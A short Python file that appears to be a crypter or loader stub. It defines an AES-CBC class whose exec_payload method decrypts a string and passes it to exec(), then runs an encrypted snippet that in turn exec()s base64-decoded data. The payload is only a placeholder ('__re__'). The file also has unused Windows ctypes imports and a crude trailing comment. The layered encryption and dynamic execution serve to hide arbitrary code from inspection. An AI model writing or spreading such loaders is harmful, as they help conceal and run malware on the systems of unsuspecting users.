import hashlib
import base64
from Crypto import Cipher
from Crypto.Cipher import AES
from Crypto import Random
import asyncio
import ctypes
import ctypes.wintypes as wt
import time
import binascii



class ASChipher(object):

    def __init__(self, key): 
        self.bs = AES.block_size
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw.encode()))

    def decrypt(self, chars):
        chars = base64.b64decode(chars)
        iv = chars[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(chars[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)
    
    def exec_payload(self, payload):
        exec(self.decrypt(payload))

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

x = ASChipher("kaowlsdoaoaoak")
x.exec_payload(x.encrypt("""import base64 ; exec(base64.b64decode('__re__'))"""))

"""
comments
ig
nore
this
shiet
omg
"""
